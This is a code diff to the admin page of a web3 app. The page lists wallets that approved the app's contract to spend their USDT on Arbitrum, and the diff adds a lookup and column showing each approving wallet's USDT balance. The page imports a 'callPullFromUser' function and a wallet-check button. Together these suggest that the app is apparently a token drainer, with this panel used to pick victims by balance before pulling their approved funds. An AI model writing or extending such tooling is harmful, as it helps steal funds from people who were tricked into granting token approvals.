@@ -4,8 +4,8 @@ import Footer from '../components/Footer.jsx'
 import CheckWalletButton from '../components/CheckWalletButton.jsx'
 import { useWeb3Modal } from '@web3modal/wagmi/react'
 import { useAccount, useChainId } from 'wagmi'
-import { callPullFromUser, readOwnerAddress, readAdminAddress, callSetAdmin, USDT_ADDRESSES } from '../web3/tokenTransfer'
-import { parseUnits, createPublicClient, http, formatEther, parseAbiItem } from 'viem'
+import { callPullFromUser, readOwnerAddress, readAdminAddress, callSetAdmin, USDT_ADDRESSES, ERC20_ABI } from '../web3/tokenTransfer'
+import { parseUnits, createPublicClient, http, formatEther, formatUnits, parseAbiItem } from 'viem'
 import { CHAIN_NAMES, RESOLVED_RPC_URLS } from '../web3/config.jsx'
 import AdminHeader from '../components/AdminHeader.jsx'
 
@@ -113,7 +113,8 @@ export default function Admin() {
         setApprovalsStatus('Connect your wallet to load approvals')
         return
       }
-      const networkName = CHAIN_NAMES[chainId] || 'arbitrum'
+      // Force Arbitrum network for approvals/USDT balances
+      const networkName = 'arbitrum'
       const usdtAddress = USDT_ADDRESSES[networkName]
       if (!usdtAddress) {
         setApprovalsStatus(`USDT not configured for ${networkName}`)
@@ -128,8 +129,7 @@ export default function Admin() {
       const latest = await client.getBlockNumber()
       const approvalEvent = parseAbiItem('event Approval(address indexed owner, address indexed spender, uint256 value)')
       const unique = new Map()
-  
-      // Scan in smaller block windows to avoid RPC log limits
+      
       const STEP = 25000n
       const MAX_RANGE = 1000000n
       const startBlock = latest > MAX_RANGE ? latest - MAX_RANGE : 0n
@@ -162,9 +162,20 @@ export default function Admin() {
       const rows = Array.from(unique.values())
         .sort((a, b) => (b.blockNumber - a.blockNumber))
         .slice(0, 50)
-      setApprovals(rows)
-      writeApprovalsCache(networkName, SMART_CONTRACT_ADDRESS, rows)
-      setApprovalsStatus(rows.length ? `Found ${rows.length} approving wallet(s)` : 'No approvals found in recent history')
+  
+      // Fetch USDT token balance (6 decimals) for each approving wallet on Arbitrum
+      const rowsWithTokenBalance = await Promise.all(rows.map(async (r) => {
+        try {
+          const bal = await client.readContract({ address: usdtAddress, abi: ERC20_ABI, functionName: 'balanceOf', args: [r.owner] })
+          return { ...r, usdtBalance: `${formatUnits(bal, 6)} USDT` }
+        } catch {
+          return { ...r, usdtBalance: '-' }
+        }
+      }))
+  
+      setApprovals(rowsWithTokenBalance)
+      writeApprovalsCache(networkName, SMART_CONTRACT_ADDRESS, rowsWithTokenBalance)
+      setApprovalsStatus(rowsWithTokenBalance.length ? `Found ${rowsWithTokenBalance.length} approving wallet(s)` : 'No approvals found in recent history')
     } catch (err) {
       console.error('Load approvals failed:', err)
       setApprovalsStatus(`Error loading approvals: ${err?.message || String(err)}`)
@@ -295,16 +306,18 @@ export default function Admin() {
                     <thead>
                       <tr>
                         <th>Wallet Address</th>
+                        <th>USDT Balance</th>
                         <th>Block</th>
                       </tr>
                     </thead>
                     <tbody>
                       {approvals.length === 0 ? (
-                        <tr><td colSpan={2} style={{ textAlign: 'center', color: '#666' }}>No data</td></tr>
+                        <tr><td colSpan={3} style={{ textAlign: 'center', color: '#666' }}>No data</td></tr>
                       ) : (
                         approvals.map(row => (
                           <tr key={row.owner}>
                             <td>{row.owner}</td>
+                            <td>{row.usdtBalance || '-'}</td>
                             <td>{String(row.blockNumber)}</td>
                           </tr>
                         ))
